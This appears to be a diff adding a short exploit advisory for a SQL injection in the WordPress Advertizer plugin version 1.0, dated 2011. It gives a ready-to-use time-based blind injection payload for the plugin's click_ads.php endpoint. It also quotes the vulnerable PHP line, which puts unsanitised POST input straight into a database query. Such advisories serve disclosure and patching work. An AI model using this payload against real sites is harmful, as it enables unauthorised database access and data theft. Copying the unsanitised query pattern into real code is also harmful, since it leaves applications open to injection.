@@ -1,0 +1,17 @@
+# Exploit Title: WordPress Advertizer plugin <= 1.0 SQL Injection Vulnerability
+# Date: 2011-08-29
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/advertizer.1.0.zip
+# Version: 1.0 (tested)
+# Note: magic_quotes has to be turned off
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/advertizer/click_ads.php
+ id=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+$res = $wpdb->get_row("SELECT `limit_clicks`, `trace_clicks` FROM `".$wpdb->prefix."adv_v_base` WHERE `id` = '".$_POST[id]."' limit 1;");
